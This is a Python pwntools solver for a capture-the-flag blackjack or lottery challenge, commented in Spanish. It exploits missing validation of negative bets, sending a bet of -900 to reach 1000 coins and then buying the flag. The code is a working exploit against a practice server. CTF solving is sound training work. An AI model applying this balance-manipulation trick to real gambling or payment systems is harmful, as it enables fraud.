#!/usr/bin/env python3
"""
Solver Blackjack CTF - FINAL
Objetivo: Obtener 1000 monedas para comprar la flag

VULNERABILIDAD ENCONTRADA:
- El código acepta float para las apuestas: bet = float(input(...))
- La validación es: if bet > coins (no check para negativos)
- Cuando pierdes: coins -= bet
- Si apostamos -900, entonces: 100 - (-900) = 1000 monedas
"""

from pwn import *
import time

HOST = "lottery.ctf.cert.unlp.edu.ar"
PORT = 35001

def exploit():
    """Exploit con apuesta negativa"""
    con = remote(HOST, PORT, timeout=10)
    
    try:
        banner = con.recvuntil(b">", timeout=5)
        print("[+] Conectado al servidor")
        print("[*] Exploit: Vulnerabilidad de apuesta negativa")
        print("[*] Si apostamos -900, monedas = 100 - (-900) = 1000\n")
        
        # Jugar una ronda
        con.sendline(b"1")
        time.sleep(0.2)
        con.recv(512, timeout=2)
        
        # Enviar apuesta negativa (-900)
        con.sendline(b"-900")
        time.sleep(0.2)
        con.recv(256, timeout=2)
        
        # Adivinar cualquier número (no importa)
        con.sendline(b"0")
        time.sleep(0.2)
        resp = con.recv(512, timeout=2).decode(errors="replace")
        print("[*] Resultado de la ronda:")
        print(resp)
        
        # Comprar flag
        con.sendline(b"2")
        time.sleep(0.2)
        result = con.recvall(timeout=3)
        
        print("\n[+] FLAG OBTENIDA:")
        print(result.decode(errors="replace"))
        
        con.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        try:
            con.close()
        except:
            pass

if __name__ == "__main__":
    print("[*] Solver Blackjack CTF - Exploit de Apuesta Negativa\n")
    exploit()
